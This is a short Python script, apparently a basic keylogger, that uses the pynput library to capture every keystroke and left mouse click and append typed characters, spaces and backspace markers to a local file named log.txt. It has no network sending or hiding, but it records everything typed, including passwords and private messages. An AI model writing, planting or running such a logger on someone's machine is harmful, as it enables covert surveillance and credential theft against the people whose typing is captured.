from pynput import keyboard, mouse

def writeFile(key):
    f = open("log.txt", "a")
    f.write(key)
    f.close()


def keyPressed(key):
    try:
        print(key)
        char = key.char
        writeFile(char)
    except:
        # FOR SPACES AND KEY THAT ARE NOT CHAR
        if (key == key.space):
            writeFile("\n")
        elif (key == key.backspace):
            writeFile('[del]')

def mouseClicked(x, y, button, pressed):
    f = open("log.txt", "a")
    print(button, "button")
    if (button == button.left):
        print("on envoie")
        writeFile("\n")


if __name__ == '__main__':
    key_listener = keyboard.Listener(on_press=keyPressed)
    mouse_listener = mouse.Listener(on_click=mouseClicked)
    key_listener.start()
    mouse_listener.start()
    input()